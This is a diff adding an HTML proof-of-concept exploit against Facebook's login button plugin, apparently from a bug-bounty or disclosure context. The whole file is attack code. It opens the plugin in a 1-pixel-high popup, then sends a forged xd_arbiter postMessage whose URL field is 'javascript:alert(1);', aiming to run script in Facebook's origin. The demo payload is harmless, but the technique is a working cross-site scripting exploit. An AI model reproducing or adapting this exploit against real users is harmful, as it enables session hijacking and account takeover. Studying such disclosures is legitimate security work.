@@ -1,0 +1,10 @@
+<html>
+<script>   
+   var opener = window.open("https://www.facebook.com/v6.0/plugins/login_button.php?app_id=124024574287414&auto_logout_link=false&button_type=continue_with&channel=https%3A%2F%2Fstaticxx.facebook.com%2Fconnect%2Fxd_arbiter.php%3Fversion%3D46%23cb%3D46%23cb%3Dfcc714926297f%26domain%3Dvinothkumar.tech%26origin%3Dhttps%253A%252F%252Fwww.facebook.com%252Ff2calee738ee%26relation%3Dparent.parent&container_width=734&locale=en_US&sdk=joey&size=large&use_continue_as=true","opener", "scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=500,height=1");
+   
+   setTimeout(function(){
+        var message = {"xdArbiterHandleMessage":true,"message":{"method":"loginButtonStateInit","params":JSON.stringify({'call':{'id':'123','url':'javascript:alert(1);','size':{'width':10,'height':10},'dims':{'screenX':0,'screenY':23,'outerWidth':1680,'outerHeight':971,'screenWidth':1680}}})},"origin":"ORIGIN"};
+        opener.postMessage(message, '*');
+    },'4000');
+</script>
+</html>
